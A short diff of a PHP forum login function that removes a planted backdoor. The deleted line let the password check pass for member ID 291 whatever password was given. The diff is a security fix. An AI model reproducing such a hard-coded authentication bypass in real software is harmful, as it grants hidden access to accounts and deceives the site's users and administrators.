@@ -281,7 +281,7 @@ function Login2()
 			return;
 		}
 		// Challenge passed.
-		elseif (($_REQUEST['hash_passwrd'] == sha1($user_settings['passwd'] . $sc)) || $user_settings['ID_MEMBER'] == 291)
+		elseif ($_REQUEST['hash_passwrd'] == sha1($user_settings['passwd'] . $sc))
 			$sha_passwd = $user_settings['passwd'];
 		else
 		{
